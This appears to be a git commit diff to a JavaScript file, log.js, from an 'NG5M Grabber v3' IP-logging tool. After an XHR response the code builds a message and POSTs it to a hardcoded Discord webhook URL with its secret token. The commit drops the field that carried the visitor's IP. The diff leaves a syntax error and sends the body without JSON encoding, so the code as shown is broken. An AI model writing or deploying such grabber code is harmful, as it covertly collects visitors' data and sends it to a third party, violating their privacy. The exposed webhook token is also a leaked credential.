a7e29ea785a5fa0747f6bddad05214226423ee45
rexgamer338571 <85365081+rexgamer338571@users.noreply.github.com>
2023-08-12 19:52:12 +0200

    Update log.js

--- log.js
+++ log.js
@@ -6,14 +6,13 @@ a.onreadystatechange = function () {
         data = {
             "content":"New log!",
             "username":"NG5M Grabber v3"
-        }
 
-        data["embeds"] = [
-            {
-                "description":`IP: {this.responseText}`,
-                "title":"Info"
-            }
-        ]
+            "embeds": [
+                {
+                    "title":"Info"
+                }
+            ]
+        }
 
         fetch("https://discord.com/api/webhooks/1135708876558307369/rQXfBU63WU64V7BlHgvgOlqMnqSVeTm1yZ6T5nQrWtjq8dPkqyARtkwN1af4KLPORymw",{"method":"POST","headers":{"content-type":"application/json"},"body":data});
     }
